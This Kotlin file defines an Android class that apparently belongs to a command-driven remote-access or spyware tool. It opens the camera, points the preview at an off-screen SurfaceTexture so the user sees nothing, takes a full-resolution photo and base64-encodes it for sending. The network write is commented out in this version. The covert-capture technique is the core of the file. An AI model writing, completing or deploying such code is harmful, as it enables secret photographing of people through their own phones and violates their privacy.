package com.xxx.zzz.commandp.taskssv

import android.content.Context
import android.graphics.Bitmap
import android.graphics.BitmapFactory
import android.graphics.SurfaceTexture
import android.hardware.Camera
import android.util.Base64
import java.io.ByteArrayOutputStream

class CameraPreview(context: Context?) {
    private var camera: Camera? = null
    private var context: Context? = null

    init {
        try {
            this.context = context
        } catch (e: Exception) {
            e.printStackTrace()
        }
    }

    fun startUp(cameraID: Int) {
        try {
            camera = Camera.open(cameraID)
        } catch (e: RuntimeException) {
            e.printStackTrace()
        }
        val parameters = camera!!.parameters
        val allSizes = parameters.supportedPictureSizes
        var size = allSizes[0]
        for (i in allSizes.indices) {
            if (allSizes[i].width > size.width) size = allSizes[i]
        }
        parameters.setPictureSize(size.width, size.height)
        camera!!.parameters = parameters
        try {
            camera!!.setPreviewTexture(SurfaceTexture(0))
            camera!!.startPreview()
        } catch (e: Exception) {
            e.printStackTrace()
        }
        camera!!.takePicture(null, null) { data, camera ->
            releaseCamera()
            sendPhoto(data)
        }
    }

    private fun sendPhoto(data: ByteArray) {
        val bos = ByteArrayOutputStream()
        val bitmap = BitmapFactory.decodeByteArray(data, 0, data.size)
        bitmap.compress(Bitmap.CompressFormat.JPEG, 80, bos)
        val byteArr = bos.toByteArray()
        val encodedImage = Base64.encodeToString(byteArr, Base64.DEFAULT)
//        val thread = Thread {
//            try {
//                out!!.write(encodedImage.toByteArray(charset("UTF-8")))
//            } catch (e: Exception) {
//                Log.e(TAG, e.message!!)
//            }
//        }
//        thread.start()
    }

    private fun releaseCamera() {
        if (camera != null) {
            camera!!.stopPreview()
            camera!!.release()
            camera = null
        }
    }

    companion object {
        var TAG = "cameraPreviewClass"
    }
}